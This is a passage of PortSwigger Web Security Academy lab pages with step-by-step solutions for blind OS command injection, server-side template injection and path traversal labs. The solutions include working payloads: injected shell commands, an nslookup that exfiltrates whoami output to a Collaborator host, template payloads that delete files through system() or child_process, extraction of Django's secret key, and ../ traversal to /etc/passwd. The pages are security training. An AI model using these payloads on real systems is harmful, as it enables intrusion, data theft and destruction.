            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/794c7ab29027c16b9a3fab84326c6f313a8af27a96f1833828edd38b26a4aca7?referrer=%2fweb-security%2fos-command-injection%2flab-blind-output-redirection"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify the request that submits feedback.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         email
        </code>
                                        parameter, changing it to:
                                    </p>
                                    <code class="code-scrollable">
        email=||whoami&gt;/var/www/images/output.txt||
       </code>
                                </li>
                                <li>
                                    Now use Burp Suite to intercept and modify the request that loads an image of a
                                    product.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         filename
        </code>
                                        parameter, changing the value to the name of the file you specified for the
                                        output of the injected command:
                                    </p>
                                    <code class="code-scrollable">
        filename=output.txt
       </code>
                                </li>
                                <li>
                                    Observe that the response contains the output from the injected command.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Blind OS command injection with out-of-band interaction
                (os-command-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a blind OS
                <a href="https://portswigger.net/web-security/os-command-injection">
                    command injection
                </a>
                vulnerability in the feedback function.
            </p>
            <p>
                The application executes a shell command containing the user-supplied details. The command is executed
                asynchronously and has no effect on the application's response. It is not possible to redirect output
                into a location that you can access. However, you can trigger out-of-band interactions with an external
                domain.
            </p>
            <p>
                To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp
                Collaborator.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's
                    default public server.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/6e6e115e1981ae822b7e41fcaccbc1cb96a5d85b63b42b80e3e6d35565209752?referrer=%2fweb-security%2fos-command-injection%2flab-blind-out-of-band"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify the request that submits feedback.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         email
        </code>
                                        parameter, changing it to:
                                    </p>
                                    <code class="code-scrollable">
        email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
       </code>
                                </li>
                                <li>
                                    Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator
                                    subdomain where indicated in the modified
                                    <code>
        email
       </code>
                                    parameter.
                                </li>
                            </ol>
                            <div class="highlightedarea">
                                <h4>
                                    Note
                                </h4>
                                <p>
                                    The solution described here is sufficient simply to trigger a DNS lookup and so
                                    solve the lab. In a real-world situation, you would use
                                    <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">
                                        Burp Collaborator
                                    </a>
                                    to verify that your payload had indeed triggered a DNS lookup. See the lab on
                                    <a
                                        href="https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration">
                                        blind OS command injection with out-of-band data exfiltration
                                    </a>
                                    for an example of this.
                                </p>
                            </div>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Blind OS
                <a href="https://portswigger.net/web-security/os-command-injection">
                    command injection
                </a>
                with out-of-band data exfiltration
                (os-command-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a blind
                <a href="https://portswigger.net/web-security/os-command-injection">
                    OS command injection
                </a>
                vulnerability in the feedback function.
            </p>
            <p>
                The application executes a shell command containing the user-supplied details. The command is executed
                asynchronously and has no effect on the application's response. It is not possible to redirect output
                into a location that you can access. However, you can trigger out-of-band interactions with an external
                domain.
            </p>
            <p>
                To solve the lab, execute the
                <code>
   whoami
  </code>
                command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name
                of the current user to complete the lab.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's
                    default public server.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/3c2c7dc2a5f53dc680195c18c290e82bc97c28f599414db388cf8cf96cb72bf5?referrer=%2fweb-security%2fos-command-injection%2flab-blind-out-of-band-data-exfiltration"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use
                                    <a href="https://portswigger.net/burp/pro">
                                        Burp Suite Professional
                                    </a>
                                    to intercept and modify the request that submits feedback.
                                </li>
                                <li>
                                    Go to the
                                    <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">
                                        Collaborator
                                    </a>
                                    tab.
                                </li>
                                <li>
                                    Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your
                                    clipboard.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         email
        </code>
                                        parameter, changing it to something like the following, but insert your Burp
                                        Collaborator subdomain where indicated:
                                    </p>
                                    <code class="code-scrollable">
        email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
       </code>
                                </li>
                                <li>
                                    Go back to the Collaborator tab, and click "Poll now". You should see some DNS
                                    interactions that were initiated by the application as the result of your payload.
                                    If you don't see any interactions listed, wait a few seconds and try again, since
                                    the server-side command is executed asynchronously.
                                </li>
                                <li>
                                    Observe that the output from your command appears in the subdomain of the
                                    interaction, and you can view this within the Collaborator tab. The full domain name
                                    that was looked up is shown in the Description tab for the interaction.
                                </li>
                                <li>
                                    To complete the lab, enter the name of the current user.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Basic server-side template injection
                (server-side-template-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/server-side-template-injection">
                    server-side template injection
                </a>
                due to the unsafe construction of an ERB template.
            </p>
            <p>
                To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete
                the
                <code>
   morale.txt
  </code>
                file from Carlos's home directory.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/401f612b786a17fa5d79a4695034393111a37b23e3c9a729cdf23878231c53e2?referrer=%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-basic"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Notice that when you try to view more details about the first product, a
                                    <code>
        GET
       </code>
                                    request uses the
                                    <code>
        message
       </code>
                                    parameter to render
                                    <code>
        "Unfortunately this product is out of stock"
       </code>
                                    on the home page.
                                </li>
                                <li>
                                    In the ERB documentation, discover that the syntax
                                    <code>
        &lt;%= someExpression %&gt;
       </code>
                                    is used to evaluate an expression and render the result on the page.
                                </li>
                                <li>
                                    <p>
                                        Use ERB template syntax to create a test payload containing a mathematical
                                        operation, for example:
                                    </p>
                                    <code class="code-scrollable">
        &lt;%= 7*7 %&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        URL-encode this payload and insert it as the value of the
                                        <code>
         message
        </code>
                                        parameter in the URL as follows, remembering to replace
                                        <code>
         YOUR-LAB-ID
        </code>
                                        with your own lab ID:
                                    </p>
                                    <code class="code-scrollable">
        https://YOUR-LAB-ID.web-security-academy.net/?message=&lt;%25%3d+7*7+%25&gt;
       </code>
                                </li>
                                <li>
                                    Load the URL in the browser. Notice that in place of the message, the result of your
                                    mathematical operation is rendered on the page, in this case, the number 49. This
                                    indicates that we may have a server-side template injection vulnerability.
                                </li>
                                <li>
                                    From the Ruby documentation, discover the
                                    <code>
        system()
       </code>
                                    method, which can be used to execute arbitrary operating system commands.
                                </li>
                                <li>
                                    <p>
                                        Construct a payload to delete Carlos's file as follows:
                                    </p>
                                    <code class="code-scrollable">
        &lt;%= system("rm /home/carlos/morale.txt") %&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        URL-encode your payload and insert it as the value of the
                                        <code>
         message
        </code>
                                        parameter, remembering to replace
                                        <code>
         YOUR-LAB-ID
        </code>
                                        with your own lab ID:
                                    </p>
                                    <code class="code-scrollable">
        https://YOUR-LAB-ID.web-security-academy.net/?message=&lt;%25+system("rm+/home/carlos/morale.txt")+%25&gt;
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Basic server-side template injection (code context)
                (server-side-template-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/server-side-template-injection">
                    server-side template injection
                </a>
                due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation
                to discover how to execute arbitrary code, then delete the
                <code>
   morale.txt
  </code>
                file from Carlos's home directory.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                Take a closer look at the "preferred name" functionality.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/871a7e42cb341b879712b73bfea3c9d086ade90c22b54e76f4db136869b3dba9?referrer=%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-basic-code-context"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    While proxying traffic through Burp, log in and post a comment on one of the blog
                                    posts.
                                </li>
                                <li>
                                    Notice that on the "My account" page, you can select whether you want the site to
                                    use your full name, first name, or nickname. When you submit your choice, a
                                    <code>
        POST
       </code>
                                    request sets the value of the parameter
                                    <code>
        blog-post-author-display
       </code>
                                    to either
                                    <code>
        user.name
       </code>
                                    ,
                                    <code>
        user.first_name
       </code>
                                    , or
                                    <code>
        user.nickname
       </code>
                                    . When you load the page containing your comment, the name above your comment is
                                    updated based on the current value of this parameter.
                                </li>
                                <li>
                                    In Burp, go to "Proxy" &gt; "HTTP history" and find the request that sets this
                                    parameter, namely
                                    <code>
        POST /my-account/change-blog-post-author-display
       </code>
                                    , and send it to Burp Repeater.
                                </li>
                                <li>
                                    <p>
                                        Study the Tornado documentation to discover that template expressions are
                                        surrounded with double curly braces, such as
                                        <code>
         {{someExpression}}
        </code>
                                        . In Burp Repeater, notice that you can escape out of the expression and inject
                                        arbitrary template syntax as follows:
                                    </p>
                                    <code class="code-scrollable">
        blog-post-author-display=user.name}}{{7*7}}
       </code>
                                </li>
                                <li>
                                    Reload the page containing your test comment. Notice that the username now says
                                    <code>
        Peter Wiener49}}
       </code>
                                    , indicating that a server-side template injection vulnerability may exist in the
                                    code context.
                                </li>
                                <li>
                                    <p>
                                        In the Tornado documentation, identify the syntax for executing arbitrary
                                        Python:
                                    </p>
                                    <code class="code-scrollable">
        {% somePython %}
       </code>
                                </li>
                                <li>
                                    Study the Python documentation to discover that by importing the
                                    <code>
        os
       </code>
                                    module, you can use the
                                    <code>
        system()
       </code>
                                    method to execute arbitrary system commands.
                                </li>
                                <li>
                                    <p>
                                        Combine this knowledge to construct a payload that deletes Carlos's file:
                                    </p>
                                    <code class="code-scrollable">
        {% import os %}
{{os.system('rm /home/carlos/morale.txt')
       </code>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, go back to
                                        <code>
         POST /my-account/change-blog-post-author-display
        </code>
                                        . Break out of the expression, and inject your payload into the parameter,
                                        remembering to URL-encode it as follows:
                                    </p>
                                    <code class="code-scrollable">
        blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
       </code>
                                </li>
                                <li>
                                    Reload the page containing your comment to execute the template and solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Server-side template injection using documentation
                (server-side-template-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/server-side-template-injection">
                    server-side template injection
                </a>
                . To solve the lab, identify the template engine and use the documentation to work out how to execute
                arbitrary code, then delete the
                <code>
   morale.txt
  </code>
                file from Carlos's home directory.
            </p>
            <p>
                You can log in to your own account using the following credentials:
            </p>
            <code class="code-scrollable">
  content-manager:C0nt3ntM4n4g3r
 </code>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You should try solving this lab using only the documentation. However, if you get really
                                stuck, you can try finding a well-known exploit by @albinowax that you can use to solve
                                the lab.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/994a665c4ea7fa2804f3b34e32aff30f4d936a60c26b48a14db2fc1e4a83e04b?referrer=%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-using-documentation"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in and edit one of the product description templates. Notice that this template
                                    engine uses the syntax
                                    <code>
        ${someExpression}
       </code>
                                    to render the result of an expression on the page. Either enter your own expression
                                    or change one of the existing ones to refer to an object that doesn't exist, such as
                                    <code>
        ${foobar}
       </code>
                                    , and save the template. The error message in the output shows that the Freemarker
                                    template engine is being used.
                                </li>
                                <li>
                                    Study the Freemarker documentation and find that appendix contains an FAQs section
                                    with the question "Can I allow users to upload templates and what are the security
                                    implications?". The answer describes how the
                                    <code>
        new()
       </code>
                                    built-in can be dangerous.
                                </li>
                                <li>
                                    Go to the "Built-in reference" section of the documentation and find the entry for
                                    <code>
        new()
       </code>
                                    . This entry further describes how
                                    <code>
        new()
       </code>
                                    is a security concern because it can be used to create arbitrary Java objects that
                                    implement the
                                    <code>
        TemplateModel
       </code>
                                    interface.
                                </li>
                                <li>
                                    Load the JavaDoc for the
                                    <code>
        TemplateModel
       </code>
                                    class, and review the list of "All Known Implementing Classes".
                                </li>
                                <li>
                                    Observe that there is a class called
                                    <code>
        Execute
       </code>
                                    , which can be used to execute arbitrary shell commands
                                </li>
                                <li>
                                    <p>
                                        Either attempt to construct your own exploit, or find
                                        <a href="https://portswigger.net/research/server-side-template-injection">
                                            @albinowax's exploit
                                        </a>
                                        on our research page and adapt it as follows:
                                    </p>
                                    <code class="code-scrollable">
        &lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; ${ ex("rm /home/carlos/morale.txt") }
       </code>
                                </li>
                                <li>
                                    Remove the invalid syntax that you entered earlier, and insert your new payload into
                                    the template.
                                </li>
                                <li>
                                    Save the template and view the product page to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Server-side template injection in an unknown language with a documented exploit
                (server-side-template-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/server-side-template-injection">
                    server-side template injection
                </a>
                . To solve the lab, identify the template engine and find a documented exploit online that you can use
                to execute arbitrary code, then delete the
                <code>
   morale.txt
  </code>
                file from Carlos's home directory.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/546e06146b126617be92ff441630f1cd8cc05bf0a17ed763ca936166fd17d95b?referrer=%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Notice that when you try to view more details about the first product, a
                                    <code>
        GET
       </code>
                                    request uses the
                                    <code>
        message
       </code>
                                    parameter to render
                                    <code>
        "Unfortunately this product is out of stock"
       </code>
                                    on the home page.
                                </li>
                                <li>
                                    Experiment by injecting a fuzz string containing template syntax from various
                                    different template languages, such as
                                    <code>
        ${{&lt;%[%'"}}%\
       </code>
                                    , into the
                                    <code>
        message
       </code>
                                    parameter. Notice that when you submit invalid syntax, an error message is shown in
                                    the output. This identifies that the website is using Handlebars.
                                </li>
                                <li>
                                    Search the web for "Handlebars server-side template injection". You should find a
                                    well-known exploit posted by
                                    <code>
        @Zombiehelp54
       </code>
                                    .
                                </li>
                                <li>
                                    <p>
                                        Modify this exploit so that it calls
                                        <code>
         require("child_process").exec("rm /home/carlos/morale.txt")
        </code>
                                        as follows:
                                    </p>
                                    <code class="code-scrollable">
        wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
       </code>
                                </li>
                                <li>
                                    <p>
                                        URL encode your exploit and add it as the value of the message parameter in the
                                        URL. The final exploit should look like this, but remember to replace
                                        <code>
         YOUR-LAB-ID
        </code>
                                        with your own lab ID:
                                    </p>
                                    <code class="code-scrollable">
        https://YOUR-LAB-ID.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
       </code>
                                </li>
                                <li>
                                    The lab should be solved when you load the URL.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Server-side template injection with
                <a href="https://portswigger.net/web-security/information-disclosure">
                    information disclosure
                </a>
                via user-supplied objects
                (server-side-template-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/server-side-template-injection">
                    server-side template injection
                </a>
                due to the way an object is being passed into the template. This vulnerability can be exploited to
                access sensitive data.
            </p>
            <p>
                To solve the lab, steal and submit the framework's secret key.
            </p>
            <p>
                You can log in to your own account using the following credentials:
            </p>
            <code class="code-scrollable">
  content-manager:C0nt3ntM4n4g3r
 </code>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/df068afc1423346dc3fc00c7af345df7970e4571cb93bd574dcce698e8bb50ed?referrer=%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in and edit one of the product description templates.
                                </li>
                                <li>
                                    Change one of the template expressions to something invalid, such as a fuzz string
                                    <code>
        ${{&lt;%[%'"}}%\
       </code>
                                    , and save the template. The error message in the output hints that the Django
                                    framework is being used.
                                </li>
                                <li>
                                    Study the Django documentation and notice that the built-in template tag
                                    <code>
        debug
       </code>
                                    can be called to display debugging information.
                                </li>
                                <li>
                                    <p>
                                        In the template, remove your invalid syntax and enter the following statement to
                                        invoke the
                                        <code>
         debug
        </code>
                                        built-in:
                                    </p>
                                    <code class="code-scrollable">
        {% debug %}
       </code>
                                </li>
                                <li>
                                    Save the template. The output will contain a list of objects and properties to which
                                    you have access from within this template. Crucially, notice that you can access the
                                    <code>
        settings
       </code>
                                    object.
                                </li>
                                <li>
                                    Study the
                                    <code>
        settings
       </code>
                                    object in the Django documentation and notice that it contains a
                                    <code>
        SECRET_KEY
       </code>
                                    property, which has dangerous security implications if known to an attacker.
                                </li>
                                <li>
                                    In the template, remove the
                                    <code>
        {% debug %}
       </code>
                                    statement and enter the expression
                                    <code>
        {{settings.SECRET_KEY}}
       </code>
                                </li>
                                <li>
                                    Save the template to output the framework's secret key.
                                </li>
                                <li>
                                    Click the "Submit solution" button and submit the secret key to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    File path traversal
                </a>
                , simple case
                (file-path-traversal)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    path traversal
                </a>
                vulnerability in the display of product images.
            </p>
            <p>
                To solve the lab, retrieve the contents of the
                <code>
   /etc/passwd
  </code>
                file.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/1eb25c72bba9c28a06ef2ee3f090ecb4ab93adf38414a9d0ae9f017f2208b937?referrer=%2fweb-security%2ffile-path-traversal%2flab-simple"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify a request that fetches a product image.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         filename
        </code>
                                        parameter, giving it the value:
                                    </p>
                                    <code class="code-scrollable">
        ../../../etc/passwd
       </code>
                                </li>
                                <li>
                                    Observe that the response contains the contents of the
                                    <code>
        /etc/passwd
       </code>
                                    file.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    File path traversal
                </a>
                , traversal sequences blocked with absolute path bypass
                (file-path-traversal)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    path traversal
                </a>
                vulnerability in the display of product images.
            </p>
            <p>
                The application blocks traversal sequences but treats the supplied filename as being relative to a
                default working directory.
            </p>
            <p>
                To solve the lab, retrieve the contents of the
                <code>
   /etc/passwd
  </code>
                file.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/9901aea6b495868d278afd6098c443f412658d4bb95b4b7a22066bf79e0c6259?referrer=%2fweb-security%2ffile-path-traversal%2flab-absolute-path-bypass"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify a request that fetches a product image.
                                </li>
                                <li>
                                    Modify the
                                    <code>
        filename
       </code>
                                    parameter, giving it the value
                                    <code>
        /etc/passwd
       </code>
                                    .
                                </li>
                                <li>
                                    Observe that the response contains the contents of the
                                    <code>
